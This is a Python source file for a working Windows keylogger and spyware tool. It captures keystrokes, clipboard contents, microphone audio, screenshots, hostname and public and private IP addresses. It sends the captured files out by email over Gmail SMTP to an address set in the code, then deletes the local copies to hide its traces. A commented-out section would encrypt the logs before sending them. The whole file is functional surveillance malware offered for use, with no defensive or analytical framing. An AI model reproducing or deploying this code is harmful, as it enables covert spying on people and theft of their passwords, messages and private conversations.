#Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key , Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet


import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab


#global variables
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"


time_iteration = 20
number_of_iterations_end = 3


microphone_time = 15

#encryption key
key = "generate using generatekey.py"
    
email_address = "email@gmail.com"
password = "**** **** ****"

toaddr = "youremail@gmail.com"


file_path = "D:\\python programs\\advanced keylogger\\Project"
extend = "\\"
file_merge = file_path + extend

#SEND EMAIL FUNCTION 
def send_email(filename , attachment , toaddr):
    from_addr = email_address
    
    msg = MIMEMultipart()

    msg['From'] = from_addr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "Key-logger results"
    
    msg.attach(MIMEText(body , 'plain'))

    filename = filename
    attachment = open(attachment ,'rb')

    p = MIMEBase('application' , 'octet-stream')
    
    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition' , "attachment ; filename = %s" % filename)

    msg.attach(p) 

    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)

    s.ehlo()

    s.login(from_addr,password)

    text = msg.as_string()

    s.sendmail(from_addr , toaddr , text)

    s.close()

#Microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs) , samplerate = fs , channels =2)
    sd.wait()

    write(file_path + extend + audio_information , fs , myrecording)

#GET COMPUTER INFORMATION FUNCTION 
def computer_information():
    with open(file_path + extend + system_information , "w") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api64.ipify.org").text
            f.write("Public Ip Address : " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get public ip address (most likely max query) " + '\n')

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private Ip: " + ipaddr + '\n')

#Copy Clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_information , "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        
        except:
            f.write("Clipboard could not be copied")

#screenshots
def screenshot():
    im = ImageGrab.grab()

    im.save(file_path + extend + screenshot_information)

#function calls
computer_information() 

copy_clipboard()

microphone()  

send_email(audio_information , file_path + extend + audio_information, toaddr)
send_email(system_information ,file_path + extend + system_information , toaddr)
send_email(clipboard_information ,file_path + extend + clipboard_information , toaddr)

#timer
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
while number_of_iterations < number_of_iterations_end:

    count =0
    keys=[]


    #On press Function 
    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count+=1
        currentTime = time.time()

        if count>=1:
            count=0
            write_file(keys)
            keys=[]

    #write to the file
    def write_file(keys):
        with open(file_path + extend + keys_information , "w") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(' ')
                    #f.close()
                elif k.find("backspace") >0:
                    f.write("")
                elif k.find("Key") == -1:
                    f.write(k)
                    #f.close()
                elif k.find("enter") >0:
                    f.write('\n')
                
    #Stopping the program
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False
        
    #Listener
    with Listener(on_press=on_press , on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        
        screenshot()
        send_email(screenshot_information ,file_path + extend + screenshot_information , toaddr)
        #send_email(keys_information , file_path + extend + keys_information , toaddr)
        

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration



#files_to_encrypt = [file_merge + system_information  , file_merge + clipboard_information , file_merge + keys_information]

#encrypted_files = [file_merge + system_information_e , file_merge + clipboard_information_e , file_merge + keys_information_e]

#count = 0 

# for encrypting_file in files_to_encrypt:
    #with open(files_to_encrypt[count], 'rb') as f:
    #   data = f.read()

    #    fernet = Fernet(key)
    #    encrypted = fernet.encrypt(data)

     #   with open (encrypted_files[count] , 'wb') as f:
     #       f.write(encrypted)

     #   send_email(encrypted_files[count] , encrypted_files[count] , toaddr)
     #   count += 1

time.sleep(20)

delete_files = [system_information , clipboard_information , keys_information , screenshot_information , audio_information]


#for cleaning up the mess and deleting the files
for file in delete_files:
    os.remove(file_merge + file)
    

